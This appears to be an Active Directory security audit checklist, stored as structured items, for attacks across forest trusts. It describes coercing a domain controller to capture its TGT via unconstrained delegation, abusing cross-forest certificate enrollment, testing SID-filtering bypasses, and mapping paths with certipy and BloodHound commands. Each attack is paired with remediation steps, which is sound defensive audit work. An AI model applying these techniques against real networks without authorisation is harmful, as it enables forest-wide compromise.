items.how_to_fix: Enable selective authentication (grant "Allowed to authenticate" only where needed), remove unnecessary cross-forest grants, apply least privilege, and monitor. Re-audit.

items.title: Abuse unconstrained delegation across forest trust
items.description: Where a printer-bug-style coercion can drive a DC from a trusted forest to authenticate to an unconstrained-delegation host (and TGT delegation is not disabled), capture that DC TGT to compromise the foreign forest.
items.how_to_find: If a host across the trust has unconstrained delegation, capture TGTs of foreign users authenticating to it (TGT delegation across forest is restricted but check config).
items.how_to_fix: Remove unconstrained delegation, disable TGT delegation across forest trusts (default), add sensitive accounts to Protected Users, and enable selective auth. Re-audit delegation + trust flags.

items.title: Exploit cross-forest ADCS trust
items.description: Where a CA is trusted across forests (NTAuth/PKI trust), abuse certificate enrollment or ESC misconfigurations to obtain a certificate that authenticates into the foreign forest.
items.how_to_find:
Where a CA is trusted across forests, enumerate/abuse enrollment for cross-forest escalation:

```
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
```
items.how_to_fix: Restrict cross-forest enrollment, remediate vulnerable templates/CA flags, enable EPA/HTTPS on enrollment, and audit issuance. Re-run certipy to confirm.

items.title: Test SID-filtering bypass conditions
items.description: Evaluate misconfigured or relaxed forest trusts (e.g., trusts where SID filtering was disabled or TGT delegation enabled) that re-open SID-history and delegation escalation across the forest boundary.
items.how_to_find: Test whether SID filtering can be bypassed (e.g. specific SID ranges, misconfig) across the trust with extra-SID tickets.
items.how_to_fix: Ensure SID filtering/quarantine is enforced on external/forest trusts, keep DCs patched (SID-filtering bypass CVEs), and monitor extra-SID tickets. Re-verify filtering blocks injected SIDs.

items.title: Map cross-forest paths in BloodHound
items.description: Collect data from both forests into BloodHound and run cross-domain/cross-forest path queries to surface concrete escalation routes that span the trust boundary.
items.how_to_find:
Collect both forests and query cross-forest attack paths in BloodHound:

```
bloodhound-python -d <forestA> ... ; bloodhound-python -d <forestB> ...
```
items.how_to_fix: Use the map to remove cross-forest attack paths (foreign ACLs, delegation, trust abuse), enable selective auth + SID filtering, and least-privilege. Re-collect to confirm paths are cut.
